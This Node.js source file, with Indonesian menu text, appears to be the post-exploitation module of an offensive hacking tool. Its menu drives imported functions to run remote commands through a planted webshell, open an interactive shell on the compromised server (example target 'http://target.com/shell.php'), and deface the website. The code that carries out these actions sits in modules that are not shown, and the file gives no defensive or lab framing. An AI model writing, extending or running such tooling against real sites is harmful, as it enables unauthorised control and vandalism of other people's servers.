const inquirer = require('inquirer');
const chalk = require('chalk');
const { showBanner } = require('../core/ui');
const { executeCommand, defaceWebsite } = require('../modules/post_exploit');
const { startShellManager } = require('../modules/shell_manager');

async function handlePost() {
    let backToMain = false;
    while (!backToMain) {
        process.stdout.write('\x1B[3J\x1B[2J\x1B[0f');
        showBanner();
        
        console.log(chalk.cyan.bold('╔════════════ POST-EXPLOITATION ═══════════╗'));
        console.log(chalk.white('  [1] 💻 Eksekusi Perintah Tunggal (RCE)'));
        console.log(chalk.white('  [2] 🐚 Masuk ke Shell Interaktif (Terminal)'));
        console.log(chalk.white('  [3] 🎭 Deface Website (via Webshell)'));
        console.log(chalk.red('  [0] ⬅️  Kembali ke Main Menu'));
        console.log(chalk.cyan.bold('╚══════════════════════════════════════════╝'));

        const { postChoice } = await inquirer.prompt([{ type: 'input', name: 'postChoice', message: chalk.cyan('➜ Pilih menu [0-3]:') }]);

        switch (postChoice) {
            case '1':
                showBanner();
                const ansCmd = await inquirer.prompt([
                    { type: 'input', name: 'shellUrl', message: 'Masukkan URL Webshell (tanpa ?cmd=):' },
                    { type: 'input', name: 'cmd', message: 'Masukkan perintah (contoh: id):', default: 'id' }
                ]);
                await executeCommand(ansCmd.shellUrl, ansCmd.cmd);
                await pause();
                break;
            case '2':
                showBanner();
                const ansShell = await inquirer.prompt([
                    { type: 'input', name: 'shellUrl', message: 'Masukkan URL Webshell (contoh: http://target.com/shell.php):' }
                ]);
                await startShellManager(ansShell.shellUrl);
                await pause();
                break;
            case '3':
                showBanner();
                const ansDeface = await inquirer.prompt([
                    { type: 'input', name: 'shellUrl', message: 'Masukkan URL Webshell:' }
                ]);
                await defaceWebsite(ansDeface.shellUrl);
                await pause();
                break;
            case '0': backToMain = true; break;
            default: console.log(chalk.red('\n[X] Pilihan tidak valid.')); await pause();
        }
    }
}
async function pause() { await inquirer.prompt([{ type: 'input', name: 'pause', message: chalk.gray('Tekan Enter...') }]); }
module.exports = { handlePost };